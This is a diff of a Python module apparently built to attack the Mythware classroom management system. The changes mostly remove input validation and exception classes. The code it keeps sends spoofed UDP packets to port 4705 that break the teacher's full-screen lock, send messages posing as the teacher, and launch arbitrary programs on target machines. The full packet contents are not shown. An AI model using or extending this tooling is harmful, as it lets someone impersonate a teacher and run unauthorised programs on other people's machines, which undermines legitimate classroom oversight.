@@ -1,8 +1,4 @@
 """
-Mythware极域课堂管理系统对抗模块
-提供反全屏、发送教师消息和启动应用程序等功能
-通过发送特定格式的UDP数据包与极域系统进行交互
-
 Powered by Coco
 Thank you!
 ————wyx6669036
@@ -12,30 +8,14 @@ import struct
 import time
 import ctypes
 from packages import UtilsManager as utils
-from packages.utils.Exceptions import NetworkException, ValidationException
 
 TARGET_PORT = 4705
 
 
 def anti_full_screen(target_ip, target_port=TARGET_PORT):
     """
-    发送反全屏数据包到指定IP
-    
-    参数:
-        target_ip (str): 目标IP地址
-        target_port (int): 目标端口，默认为4705
-        
-    返回:
-        None
-        
-    异常:
-        ValidationException: 当IP地址无效时抛出异常
-        NetworkException: 当发送数据包失败时抛出异常
+    反全屏
     """
-    # 验证IP地址
-    if not target_ip or not isinstance(target_ip, str):
-        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
-    
     # 创建UDP套接字
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -69,40 +49,15 @@ def anti_full_screen(target_ip, target_port=TARGET_PORT):
         # 发送数据包
         sock.sendto(payload, target_addr)
         utils.info(f"[+] Sent to {target_ip}:{target_port} (anti_full_screen)")
-    except socket.error as e:
-        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Failed to send anti_full_screen packet to {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
     except Exception as e:
-        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Unexpected error sending anti_full_screen packet to {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
+        utils.error(f"[-] Failed to send to {target_ip}: {e}")
     finally:
         sock.close()
 
 def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
     """
-    以老师身份发送消息到指定IP
-    
-    参数:
-        text (str): 要发送的消息内容
-        target_ip (str): 目标IP地址
-        target_port (int): 目标端口，默认为4705
-        
-    返回:
-        None
-        
-    异常:
-        ValidationException: 当参数无效时抛出异常
-        ValueError: 当数据包长度不为954字节时抛出异常
-        NetworkException: 当发送数据包失败时抛出异常
+    以老师身份发送消息
     """
-    # 验证输入参数
-    if not text or not isinstance(text, str):
-        raise ValidationException("Invalid message text", field_name="text", field_value=text)
-    if not target_ip or not isinstance(target_ip, str):
-        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
-    
     # 创建UDP套接字
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -152,9 +107,8 @@ def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
         
     # 验证数据包长度
     if len(payload) != 954:
-        error_msg = f"pack lenth err: lenth{len(payload)}，should be 954"
-        utils.error(f"[-] {error_msg}")
-        raise ValueError(error_msg)
+        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be 954")
+        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be 954")
     
     
     # 修改第19字节为GetTickCount()低8位
@@ -167,43 +121,16 @@ def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
         # 发送数据包
         sock.sendto(payload, target_addr)
         utils.info(f"[+] Sent to {target_ip}:{target_port} (send_teacher_message)")
-    except socket.error as e:
-        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Failed to send teacher message to {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
     except Exception as e:
-        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Unexpected error sending teacher message to {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
+        utils.error(f"[-] Failed to send to {target_ip}: {e}")
     finally:
         sock.close()
 
 def start_applicaion(path, target_ip, target_port=TARGET_PORT):
     """
-    以老师身份在目标机器上打开指定程序
-    
-    参数:
-        path (str): 要启动的程序路径，使用单斜杠，如C:\Windows\system32\bbb.exe
-        target_ip (str): 目标IP地址
-        target_port (int): 目标端口，默认为4705
-        
-    返回:
-        None
-        
-    异常:
-        ValidationException: 当参数无效时抛出异常
-        ValueError: 当数据包长度不为906字节时抛出异常
-        NetworkException: 当发送数据包失败时抛出异常
-        
-    注意:
-        path参数应使用单斜杠格式，例如C:\Windows\system32\bbb.exe
+    以老师身份打开指定程序
+    注意，path使用单斜杠，如C:\Windows\system32\bbb.exe
     """
-    # 验证输入参数
-    if not path or not isinstance(path, str):
-        raise ValidationException("Invalid application path", field_name="path", field_value=path)
-    if not target_ip or not isinstance(target_ip, str):
-        raise ValidationException("Invalid IP address", field_name="target_ip", field_value=target_ip)
-    
     # 创建UDP套接字
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -234,9 +161,8 @@ def start_applicaion(path, target_ip, target_port=TARGET_PORT):
 
     # 验证数据包长度
     if len(payload) != 906:
-        error_msg = f"pack lenth err: lenth{len(payload)}，should be 906"
-        utils.error(f"[-] {error_msg}")
-        raise ValueError(error_msg)
+        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be 906")
+        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be 906")
     
     
     # 修改第19字节为GetTickCount()低8位
@@ -249,14 +175,8 @@ def start_applicaion(path, target_ip, target_port=TARGET_PORT):
         # 发送数据包
         sock.sendto(payload, target_addr)
         utils.info(f"[+] Sent to {target_ip}:{target_port} (start_application)")
-    except socket.error as e:
-        utils.error(f"[-] Network error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Failed to start application on {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
     except Exception as e:
-        utils.error(f"[-] Unexpected error sending to {target_ip}: {e}", e)
-        raise NetworkException(f"Unexpected error starting application on {target_ip}:{target_port}", 
-                              target_ip=target_ip, target_port=target_port) from e
+        utils.error(f"[-] Failed to send to {target_ip}: {e}")
     finally:
         sock.close()
 
